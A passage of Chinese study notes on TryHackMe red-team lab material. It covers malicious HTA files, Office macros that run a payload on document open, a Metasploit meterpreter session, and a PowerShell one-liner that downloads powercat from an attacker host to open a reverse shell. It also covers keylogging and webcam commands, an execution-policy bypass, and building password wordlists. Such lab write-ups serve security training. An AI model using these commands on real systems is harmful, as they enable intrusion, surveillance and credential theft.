引擎运行时会继承当前用户的访问权限，因此它对红队人员非常有用。</p><p>现在，我们编写一个简单的 VBScript 代码，用于创建一个 Windows 消息框，显示“Welcome to THM”消息。请将以下代码保存为 <strong>hello.vbs</strong> 文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dim message </span><br><span class="line">message = &quot;Welcome to THM&quot;</span><br><span class="line">MsgBox message</span><br></pre></td></tr></table></figure><p>在第一行，我们使用 <strong>Dim</strong> 关键字声明变量 <strong>message</strong>。然后，将字符串 <strong>“Welcome to THM”</strong> 存储到 <strong>message</strong> 变量中。接下来，我们使用 <strong>MsgBox</strong> 函数显示变量的内容。关于 <strong>MsgBox</strong> 函数的详细信息，请访问相关资源。</p><p>最后，我们使用 <strong>wscript</strong>(也可以使用cscript) 运行 <strong>hello.vbs</strong> 文件，执行后会弹出一个 Windows 消息框，显示“Welcome to THM”消息。</p><p>另一个技巧。如果 VBS 文件被列入黑名单，那么我们可以将文件重命名为 .txt 文件，然后使用 wscript 运行它，如下所示，</p><p>Terminal</p><h3 id="HTML-应用程序（HTA）"><a href="#HTML-应用程序（HTA）" class="headerlink" title="HTML 应用程序（HTA）"></a>HTML 应用程序（HTA）</h3><p>HTA 代表 <strong>“HTML Application”（HTML 应用程序）</strong>，它允许创建一个可下载的文件，其中包含所有显示和渲染所需的信息。HTML 应用程序（HTA）实际上是包含 <strong>JScript</strong> 和 <strong>VBScript</strong> 的动态 HTML 页面。</p><p>Windows 内置的 <strong>LOLBINS（Living-off-the-Land Binaries）</strong> 工具 <strong>mshta</strong> 可用于执行 HTA 文件。HTA 文件既可以独立运行，也可以通过 <strong>Internet Explorer</strong> 自动执行。</p><hr><p>在以下示例中，我们将在载荷中使用 <strong>ActiveXObject</strong> 作为概念验证（PoC），以执行 <strong>cmd.exe</strong>。请参考以下 HTML 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var c = &#x27;cmd.exe&#x27;</span><br><span class="line">new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后，将 <strong>payload.hta</strong> 托管在 Web 服务器上，可以通过攻击机执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ python3 -m http.server 8090</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)</span><br></pre></td></tr></table></figure><p>下载即会自动执行</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250325195837580.png" alt="image-20250325195837580"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250325195813987.png" alt="image-20250325195813987"></p><h4 id="HTA-反向连接"><a href="#HTA-反向连接" class="headerlink" title="HTA 反向连接"></a><strong>HTA 反向连接</strong></h4><p>操作同上只不过是要把文件改为我们的反向shell文件</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250325201218372.png" alt="image-20250325201218372"></p><h4 id="通过-Metasploit-发起的恶意-HTA"><a href="#通过-Metasploit-发起的恶意-HTA" class="headerlink" title="通过 Metasploit 发起的恶意 HTA"></a>通过 Metasploit 发起的恶意 HTA</h4><p>这是一种利用 <strong>Metasploit</strong> 生成和托管 <strong>恶意 HTA（HTML Application）文件</strong> 进行攻击的方法。以下是完整的流程，包括如何生成、托管 HTA 文件并获取反向 shell 连接：</p><hr><h5 id="1-运行-Metasploit"><a href="#1-运行-Metasploit" class="headerlink" title="1. 运行 Metasploit"></a><strong>1. 运行 Metasploit</strong></h5><p>在 Kali 终端输入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure><hr><h5 id="2-使用-hta-server-模块"><a href="#2-使用-hta-server-模块" class="headerlink" title="2. 使用 hta_server 模块"></a><strong>2. 使用 <code>hta_server</code> 模块</strong></h5><p>在 Metasploit 控制台中，输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">set LHOST 10.8.232.37       # 设置本机 IP 地址</span><br><span class="line">set LPORT 443               # 设置监听端口</span><br><span class="line">set SRVHOST 10.8.232.37     # 设置服务器 IP 地址</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">exploit                     # 执行攻击模块</span><br></pre></td></tr></table></figure><p>成功运行后，Metasploit 会生成一个恶意 HTA 文件，并提供一个 URL，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure><p>此时，攻击者的 Kali 机器正在监听 <strong>端口 443</strong>，并等待受害者访问该 HTA 文件。</p><hr><h5 id="3-受害者执行-HTA-文件"><a href="#3-受害者执行-HTA-文件" class="headerlink" title="3. 受害者执行 HTA 文件"></a><strong>3. 受害者执行 HTA 文件</strong></h5><p>当受害者访问 <code>http://10.8.232.37:8080/TkWV9zkd.hta</code> 时，HTA 文件会执行，并尝试连接回攻击者的 Kali 机器。</p><p>在 Kali 终端，你会看到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] 10.10.201.254    hta_server - Delivering Payload</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.201.254</span><br><span class="line">[*] Meterpreter session 1 opened (10.8.232.37:443 -&gt; 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600</span><br></pre></td></tr></table></figure><hr><h5 id="4-进入-Meterpreter-会话"><a href="#4-进入-Meterpreter-会话" class="headerlink" title="4. 进入 Meterpreter 会话"></a><strong>4. 进入 Meterpreter 会话</strong></h5><p>一旦 Meterpreter 连接成功，可以输入以下命令交互：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -i 1    # 进入会话</span><br></pre></td></tr></table></figure><p>然后使用 <code>sysinfo</code> 查看受害者的系统信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : DESKTOP-1AU6NT4</span><br><span class="line">OS              : Windows 10 (10.0 Build 14393)</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><p>可以进一步获取 Windows Shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p>终端输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process 4124 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\app&gt;</span><br></pre></td></tr></table></figure><p>此时，你已经获得了 Windows 受害者系统的命令行访问权限。</p><hr><h5 id="5-进一步操作"><a href="#5-进一步操作" class="headerlink" title="5. 进一步操作"></a><strong>5. 进一步操作</strong></h5><ul><li><p><strong>获取权限</strong>（提权）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure></li><li><p><strong>列出当前用户</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure></li><li><p><strong>打开摄像头</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">meterpreter &gt; webcam_snap</span><br></pre></td></tr></table></figure></li><li><p><strong>键盘记录</strong>（键盘记录器）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br></pre></td></tr></table></figure></li><li><p><strong>下载文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; download C:\Users\admin\Desktop\passwords.txt /root/passwords.txt</span><br></pre></td></tr></table></figure></li></ul><h3 id="Visual-Basic-应用程序-VBA"><a href="#Visual-Basic-应用程序-VBA" class="headerlink" title="Visual Basic 应用程序 - VBA"></a>Visual Basic 应用程序 - VBA</h3><p>打开</p><p>VBA（Visual Basic for Applications）是微软开发的一种编程语言，主要用于 Microsoft Word、Excel、PowerPoint 等微软应用程序。VBA 编程允许自动化几乎所有用户在 Microsoft Office 应用程序中的键盘和鼠标交互操作。</p><p>宏（Macros）是指在 Microsoft Office 应用程序中嵌入了 VBA 代码的功能模块。它们可以用于创建自定义函数，通过自动化流程来加快手动任务的执行速度。VBA 的一项重要功能是能够访问 Windows 应用程序编程接口（API）以及其他底层功能。关于 VBA 的更多信息，请访问相关资料。</p><p>在本任务中，我们将讨论 VBA 的基础知识，以及攻击者如何利用宏来创建恶意的 Microsoft 文档。要跟进本任务的内容，请确保在任务 2 中部署附带的 Windows 机器。准备就绪后，该机器将通过浏览器访问。</p><p>现在，请从“开始”菜单打开 Microsoft Word 2016。打开后点击</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327093536798.png" alt="image-20250327093536798"></p><p>点击创建</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327094143036.png" alt="image-20250327094143036"></p><p>输入实验代码然后点击f5运行即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327094213865.png" alt="image-20250327094213865"></p><p>然后后我们可以利用AutoOpen和Document_open是文档打开及立即执行</p><p>我们直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">    Dim payload As String</span><br><span class="line">    payload = &quot;ji.vbs&quot; //启动计算机的程序</span><br><span class="line">    CreateObject(&quot;Wscript.Shell&quot;).Run payload, 0</span><br><span class="line">End Sub</span><br><span class="line">//</span><br><span class="line">在上述示例中，函数的第一行代码是Dim payload As String，表示使用Dim关键字将payload变量声明为字符串，然后是payload = &quot;ji.vbs&quot;，表示指定载荷名称，最后是CreateObject(&quot;Wscript.Shell&quot;).Run payload，表示创建一个Windows脚本宿主(WSH)对象并运行payload。</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327095356129.png" alt="image-20250327095356129"></p><p>接下来我们就可以使用Metasploit框架创建一个内存meterpreter载荷，以实现攻击机接收反向shell。</p><p>需要将生成的载荷的内容中的<code>Workbook_Open()</code>函数更改为<code>Document_Open()</code>函数，从而使其适合在MS word文档中运行。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327104028056.png" alt="image-20250327104028056"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327110329196.png" alt="image-20250327110329196"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327110549217.png" alt="image-20250327110549217"></p><h3 id="PowerShell（PSH）"><a href="#PowerShell（PSH）" class="headerlink" title="PowerShell（PSH）"></a>PowerShell（PSH）</h3><p>PowerShell 是一种面向对象的编程语言，在 .NET 框架的动态语言运行时（DLR）上执行，但对于某些旧版用途存在例外。更多关于 PowerShell 的信息，请查看 TryHackMe 的 <strong>Hacking with PowerShell</strong> 课程。</p><p>红队人员依赖 PowerShell 执行各种任务，包括初始访问、系统枚举等。让我们先创建一个简单的 PowerShell 脚本，打印 <strong>“Welcome to the Weaponization Room!”</strong>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><p>将文件保存为 <strong>thm.ps1</strong>。该脚本使用 <code>Write-Output</code> 命令在命令提示符中打印 <strong>“Welcome to the Weaponization Room!”</strong>。现在让我们运行它并查看结果。</p><h4 id="运行-PowerShell-脚本"><a href="#运行-PowerShell-脚本" class="headerlink" title="运行 PowerShell 脚本"></a>运行 PowerShell 脚本</h4><p>在 CMD 中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -File thm.ps1</span><br></pre></td></tr></table></figure><p>但可能会遇到以下错误：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more</span><br><span class="line">information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.</span><br></pre></td></tr></table></figure><hr><h4 id="执行策略（Execution-Policy）"><a href="#执行策略（Execution-Policy）" class="headerlink" title="执行策略（Execution Policy）"></a>执行策略（Execution Policy）</h4><p>PowerShell 的执行策略是一种安全选项，用于防止系统运行恶意脚本。出于安全考虑，Microsoft 默认禁用了 PowerShell 脚本（.ps1）的执行。默认执行策略为 <strong>Restricted</strong>，这意味着可以运行单个命令，但不允许运行任何脚本。</p><p>可以使用以下命令查看当前执行策略：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>如果需要更改执行策略，可以运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</span><br></pre></td></tr></table></figure><p>执行后，PowerShell 将提示用户确认更改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Execution Policy Change</span><br><span class="line">The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose</span><br><span class="line">you to security risks described in the about_Execution_Policies help topic at</span><br><span class="line">http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?</span><br><span class="line">[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is &quot;N&quot;):</span><br></pre></td></tr></table></figure><p>输入 <code>A</code>（Yes to All）以应用更改。</p><hr><h4 id="绕过执行策略（Bypass-Execution-Policy）"><a href="#绕过执行策略（Bypass-Execution-Policy）" class="headerlink" title="绕过执行策略（Bypass Execution Policy）"></a>绕过执行策略（Bypass Execution Policy）</h4><p>Microsoft 允许用户通过参数修改执行策略，以便运行 PowerShell 脚本。例如，我们可以使用 <strong>bypass</strong> 策略，完全解除执行限制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br></pre></td></tr></table></figure><p>执行后，屏幕将输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure><p>现在，我们尝试使用 PowerShell 编写的工具 <strong>powercat</strong> 获取反向 Shell。</p><h4 id="1-在攻击机上下载-Powercat"><a href="#1-在攻击机上下载-Powercat" class="headerlink" title="1. 在攻击机上下载 Powercat"></a>1. 在攻击机上下载 Powercat</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br><span class="line">Cloning into &#x27;powercat&#x27;...</span><br><span class="line">Receiving objects: 100% (239/239), done.</span><br><span class="line">Resolving deltas: 100% (72/72), done.</span><br></pre></td></tr></table></figure><h4 id="2-启动-Web-服务器托管-Powercat"><a href="#2-启动-Web-服务器托管-Powercat" class="headerlink" title="2. 启动 Web 服务器托管 Powercat"></a>2. 启动 Web 服务器托管 Powercat</h4><p>切换到 <strong>powercat</strong> 目录并启动 Web 服务器（监听 8080 端口）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd powercat</span><br><span class="line">python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure><h4 id="3-监听端口接收反向-Shell"><a href="#3-监听端口接收反向-Shell" class="headerlink" title="3.监听端口接收反向 Shell"></a>3.监听端口接收反向 Shell</h4><p>在攻击机上使用 <code>nc</code> 监听 1337 端口，以接收来自目标机器的连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1337</span><br></pre></td></tr></table></figure><hr><h4 id="4-在目标机器上执行-PowerShell-载荷"><a href="#4-在目标机器上执行-PowerShell-载荷" class="headerlink" title="4. 在目标机器上执行 PowerShell 载荷"></a>4. 在目标机器上执行 PowerShell 载荷</h4><p>在受害者机器上，使用以下命令下载并执行 Powercat 脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><p>执行上述命令后，受害者机器将从攻击机的 Web 服务器（监听 8080 端口）下载 <code>powercat.ps1</code> 载荷，并在本地执行它，最终通过 <code>cmd.exe</code> 发送反向连接至攻击机的 1337 端口。</p><hr><h4 id="5-在攻击机上接收反向-Shell"><a href="#5-在攻击机上接收反向-Shell" class="headerlink" title="5. 在攻击机上接收反向 Shell"></a>5. 在攻击机上接收反向 Shell</h4><p>在攻击机上监听 <code>1337</code> 端口后，几秒钟内即可收到受害者的回连：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.12.53: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\thm&gt;</span><br></pre></td></tr></table></figure><p>此时，攻击机成功获得了目标机器的 Shell 访问权限。</p><h3 id="CS2"><a href="#CS2" class="headerlink" title="CS2"></a>CS2</h3><h4 id="什么是命令与控制（C2）？"><a href="#什么是命令与控制（C2）？" class="headerlink" title="什么是命令与控制（C2）？"></a>什么是命令与控制（C2）？</h4><p>C2 框架是后渗透框架，允许红队成员协作并控制已被攻陷的机器。C2 被认为是红队在进攻性网络行动中最重要的工具之一。C2 框架提供了快速且简便的方法来：</p><ul><li>生成各种恶意载荷</li><li>枚举已攻陷的机器&#x2F;网络</li><li>执行权限提升和跳跃</li><li>横向移动</li><li>以及其他许多操作</li></ul><p>我们将简要介绍一些流行的 C2 框架，包括 Cobalt Strike、PowerShell Empire 和 Metasploit。这些框架大多数旨在为红队操作提供一个方便的环境，帮助团队在获得系统初步访问权限后进行共享和沟通。</p><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p>Cobalt Strike 是一个商业化框架，专注于对抗模拟和红队操作。它结合了远程访问工具、后渗透能力和独特的报告系统。它为代理提供了高级技术，用于建立隐蔽通信并执行各种操作，包括键盘记录、文件上传与下载、VPN 部署、权限提升技术、mimikatz、端口扫描以及最先进的横向移动。</p><h4 id="PowerShell-Empire"><a href="#PowerShell-Empire" class="headerlink" title="PowerShell Empire"></a>PowerShell Empire</h4><p>PowerShell Empire 是一个开源框架，帮助红队操作员和渗透测试人员在多台服务器之间使用密钥和共享密码进行协作。它是一个基于 PowerShell 和 Python 代理的渗透框架，专注于 Windows 和 Active Directory 环境的客户端和后渗透操作。如果您想了解更多有关 PowerShell Empire 的信息，建议尝试这个课程：Empire。</p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>Metasploit 是一个广泛使用的渗透框架，提供了各种技术和工具，便于轻松执行黑客攻击。它是一个开源框架，被认为是渗透测试和红队操作的主要工具之一。Metasploit 是我们在此课程中使用的工具之一，用于在武器化阶段生成载荷。如果您想了解更多关于 Metasploit 框架的信息，建议查看 Metasploit 模块。</p><p>大多数 C2 框架使用本课程中提到的技术作为初步访问阶段的准备工作。如需详细了解 C2 框架，欢迎查阅 <strong>Intro to C2</strong> 课程。</p><p>cs在</p><h2 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>我们将讨论获取和生成自定义密码列表的方法。以下是我们将探讨的一些主题：</p><ul><li>密码分析（Password profiling）</li><li>密码攻击技术（Password attacks techniques）</li><li>在线密码攻击（Online password attacks）</li></ul><h4 id="什么是密码？"><a href="#什么是密码？" class="headerlink" title="什么是密码？"></a>什么是密码？</h4><p>密码是一种身份验证方法，允许个人访问计算机系统或应用程序。使用密码可以确保只有账户所有者才能访问系统。然而，如果密码被共享或落入不法分子手中，未经授权的更改可能会发生，甚至可能导致系统状态受损或文件系统被破坏。</p><p>密码通常由字母、数字和符号的组合构成，用户可以自行决定如何创建密码。密码的集合通常被称为**字典（dictionary）**或**密码列表（wordlist）**。低复杂度、易猜测的密码经常出现在各种公开披露的密码泄露数据中。例如，常见的弱密码包括 <strong>password</strong>、<strong>123456</strong>、<strong>111111</strong> 等。</p><p>由于许多用户使用简单密码，攻击者在对目标或服务进行密码攻击时，往往可以快速破解密码。因此，选择一个<strong>强密码</strong>是最佳实践，使其难以被猜测或破解。强密码不应是常见单词或字典中的词汇，并且应至少包含 <strong>8 个字符</strong>，包括大小写字母、数字和符号（例如：*&amp;^%$#@）。</p><p>有时，公司会制定自己的密码策略，并强制用户在创建密码时遵循相关指南。这有助于确保用户不会在组织内部使用常见或弱密码，从而减少<strong>暴力破解</strong>等攻击向量。例如，密码可能需要至少 <strong>8 个字符</strong>，包含字母、数字以及至少一个特殊符号。然而，如果攻击者掌握了密码策略，就可以根据该策略生成一个满足要求的密码列表，从而提高破解成功的可能性。</p><h4 id="密码的安全性如何？"><a href="#密码的安全性如何？" class="headerlink" title="密码的安全性如何？"></a>密码的安全性如何？</h4><p>密码是访问在线账户或计算机系统的一种保护方法，其主要目标是确保安全性，并防止密码被共享或泄露。</p><p>那么，密码到底有多安全？答案取决于多个因素。通常，密码存储在<strong>文件系统</strong>或<strong>数据库</strong>中，保护密码的安全至关重要。过去曾出现一些公司将密码以<strong>明文</strong>存储在文档中的情况，例如 <strong>2014 年 Sony 数据泄露事件</strong>。在这种情况下，一旦攻击者获得文件系统访问权限，就可以轻松获取并重用这些密码。</p><p>另一方面，某些系统会使用<strong>哈希函数</strong>或<strong>加密算法</strong>来存储密码，从而提高安全性。即使攻击者获得了系统访问权限，也需要额外的破解工作才能获取密码。我们将在后续任务中介绍<strong>哈希破解</strong>相关内容。</p><h3 id="密码攻击技术"><a href="#密码攻击技术" class="headerlink" title="密码攻击技术"></a><strong>密码攻击技术</strong></h3><p>在本节中，我们将讨论可用于执行密码攻击的各种技术，包括：</p><ul><li><strong>字典攻击（Dictionary Attack）</strong></li><li><strong>暴力破解（Brute-Force Attack）</strong></li><li><strong>基于规则的攻击（Rule-Based Attack）</strong></li><li><strong>猜测攻击（Guessing Attack）</strong></li></ul><p>上述所有攻击方式都被认为是<strong>主动“在线”攻击</strong>，攻击者需要与目标系统进行通信，以获取密码并实现未授权访问。</p><hr><h4 id="密码破解-vs-密码猜测"><a href="#密码破解-vs-密码猜测" class="headerlink" title="密码破解 vs. 密码猜测"></a><strong>密码破解 vs. 密码猜测</strong></h4><p>本节将从网络安全的角度讨论**密码破解（Password Cracking）**的相关术语，并介绍密码破解与密码猜测的主要区别。此外，我们还将演示一些用于密码破解的工具，例如 <strong>Hashcat</strong> 和 <strong>John the Ripper</strong>。</p><p>**密码破解（Password Cracking）**是一种通过分析加密或哈希数据来发现明文密码的技术。攻击者可能从被入侵的计算机中获取加密或哈希密码，或者通过监听网络流量获取密码数据。一旦获取了哈希密码，攻击者就可以利用各种工具对其进行破解，以恢复原始密码。</p><p>密码破解被认为是渗透测试（Penetration Testing）中一种传统的技术，其主要目标是<strong>让攻击者提升权限，以访问计算机系统或网络</strong>。</p><p>尽管**密码猜测（Password Guessing）<strong>和</strong>密码破解（Password Cracking）**在信息安全领域常被提及，但两者存在显著差异：</p><table><thead><tr><th><strong>密码猜测（Password Guessing）</strong></th><th><strong>密码破解（Password Cracking）</strong></th></tr></thead><tbody><tr><td>主要针对<strong>在线协议和服务</strong></td><td>主要在<strong>本地或受控系统</strong>上执行</td></tr><tr><td>由于需要<strong>与目标系统通信</strong>，通常较慢</td><td>速度较快，受计算能力影响</td></tr><tr><td>每次尝试都会产生<strong>登录失败日志</strong>，易被检测</td><td>通常不会触发目标系统的警报</td></tr><tr><td>可能会导致<strong>账户被锁定</strong>（如配置安全机制）</td><td>不会影响目标账户状态</td></tr></tbody></table><p>在<strong>Web 应用或其他在线系统</strong>上进行密码猜测攻击通常需要发送独立的请求，每次尝试都会生成新的日志记录。因此，密码猜测攻击通常容易被检测，并且在安全性较高的系统上，可能会导致账户被锁定。</p><p>相较之下，<strong>密码破解</strong>通常是<strong>在攻击者本地执行</strong>，不会直接与目标系统交互，因此<strong>更难被检测</strong>，但破解速度取决于计算能力和哈希算法的复杂性。</p><h3 id="密码分析1"><a href="#密码分析1" class="headerlink" title="密码分析1"></a>密码分析1</h3><p>拥有一个优质的密码字典对于成功实施密码攻击至关重要。了解如何生成用户名列表和密码列表同样重要。在本节中，我们将讨论如何创建针对特定目标的用户名和密码列表，并涵盖多个相关主题，包括默认密码、弱密码、泄露密码以及定制密码字典的创建方法。</p><h4 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h4><p>在执行密码攻击之前，值得尝试一些默认密码来测试目标服务。许多设备和系统（如交换机、防火墙、路由器等）在出厂时都会设置默认密码。在某些情况下，用户未更改默认密码，这使得系统容易受到攻击。因此，可以先尝试常见的默认组合，例如 <code>admin:admin</code>、<code>admin:123456</code> 等。如果已知目标设备的类型，还可以查询其默认密码并进行尝试。例如，若目标服务器是 Tomcat（一款轻量级开源 Java 应用服务器），则可能的默认密码包括 <code>admin:admin</code> 或 <code>tomcat:admin</code>。</p><p>以下是一些提供各种设备默认密码的网站列表：</p><ul><li><a href="https://cirt.net/passwords">https://cirt.net/passwords</a></li><li><a href="https://default-password.info/">https://default-password.info/</a></li><li><a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li></ul><h4 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h4><p>专业人士在长期的渗透测试和攻击分析中积累了大量的弱密码，并经常将其整合成一个大型字典。这些字典通常来源于经验总结，也可能包含已经公开的泄露密码。以下是一些常见的弱密码列表：</p><ul><li><a href="https://www.skullsecurity.org/wiki/Passwords">Skull Security Passwords</a> - 包含最知名的密码合集。</li><li><strong><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a></strong> - 一个庞大的密码字典集合，不仅限于密码破解用途。</li></ul><h4 id="泄露密码"><a href="#泄露密码" class="headerlink" title="泄露密码"></a>泄露密码</h4><p>由于数据泄露，密码或哈希值等敏感信息可能会被公开或出售。这些可公开或私下流传的数据通常被称为“数据转储”（dumps）。根据数据转储的内容，攻击者可能需要从中提取明文密码。在某些情况下，数据仅包含密码哈希值，需要进行破解才能获取明文密码。以下是一些包含弱密码和泄露密码的常见字典，例如 webhost、elitehacker、hak5、Hotmail、PhpBB 等公司的泄露数据：</p><ul><li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases"><strong>SecLists&#x2F;Passwords&#x2F;Leaked-Databases</strong></a></li></ul><h4 id="组合密码字典"><a href="#组合密码字典" class="headerlink" title="组合密码字典"></a>组合密码字典</h4><p>假设我们有多个密码字典，我们可以将它们合并成一个大型文件。可以使用 <code>cat</code> 命令进行合并：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1.txt file2.txt file3.txt &gt; combined_list.txt</span><br></pre></td></tr></table></figure><p>为了清理合并后的密码列表并去除重复项，可以使用 <code>sort</code> 和 <code>uniq</code> 命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</span><br></pre></td></tr></table></figure><hr><h4 id="定制密码字典"><a href="#定制密码字典" class="headerlink" title="定制密码字典"></a>定制密码字典</h4><p>定制密码列表是提高找到有效凭据概率的最佳方法之一。我们可以从目标网站提取有价值的信息来创建自定义密码列表。例如，企业网站通常包含与公司及其员工相关的信息，包括电子邮件地址、员工姓名等。此外，网站可能包含与企业业务相关的关键词（如产品或服务名称），而这些关键词往往可能被用于员工的密码中。</p><p>工具 <strong>Cewl</strong> 可用于高效爬取网站并提取字符串或关键词。Cewl 是一个强大的工具，可用于针对特定公司或目标生成密码字典。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl -w list.txt -d 5 -m 5 http://thm.labs</span><br></pre></td></tr></table></figure><p><strong>参数解析：</strong></p><ul><li><code>-w</code>：将爬取的内容写入文件，在此示例中为 <code>list.txt</code></li><li><code>-m 5</code>：仅获取长度 <strong>≥5</strong> 个字符的单词</li><li><code>-d 5</code>：设定爬取深度为 5（默认 2）</li><li><code>http://thm.labs</code>：目标网站 URL</li></ul><p>执行后，我们将获得一个包含该企业相关词汇（如员工姓名、地名、业务术语等）的较大规模密码字典。此外，生成的字典也可用于用户名枚举攻击。</p><p>请使用 Cewl 针对 